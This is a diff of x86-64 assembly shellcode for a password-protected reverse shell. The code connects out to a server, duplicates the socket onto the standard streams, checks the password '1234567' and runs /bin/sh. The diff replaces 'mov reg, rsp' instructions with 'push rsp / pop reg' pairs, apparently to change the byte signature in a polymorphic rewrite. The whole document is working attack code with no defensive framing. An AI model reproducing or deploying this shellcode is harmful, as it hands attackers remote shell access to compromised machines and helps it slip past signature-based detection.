@@ -30,8 +30,9 @@ _start:
         push rbx
 
         ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
-        
-        mov rsi, rsp
+       
+	push rsp
+	pop rsi 
         mov al,42
         mov dl,16
         syscall
@@ -52,7 +53,8 @@ dup2cycle:
         ; xor rax,rax - already zeroed out by prev cycle
         xor rdi,rdi
         push rax
-        mov rsi,rsp
+	push rsp
+	pop rsi
         mov dl,8
         syscall
 
@@ -60,7 +62,8 @@ dup2cycle:
         xchg rcx,rax
         mov rbx,0x0a37363534333231
         push rbx
-        mov rdi,rsp
+	push rsp
+	pop rdi
         repe cmpsb
         jnz wrong_pwd
 
@@ -72,11 +75,14 @@ dup2cycle:
         push rdx
         mov rbx, 0x68732f6e69622f2f
         push rbx
-        mov rdi, rsp
+	push rsp
+	pop rdi
         push rdx
-        mov rdx, rsp
+	push rsp
+	pop rdx
         push rdi
-        mov rsi, rsp
+	push rsp
+	pop rsi
         syscall
 
 wrong_pwd:
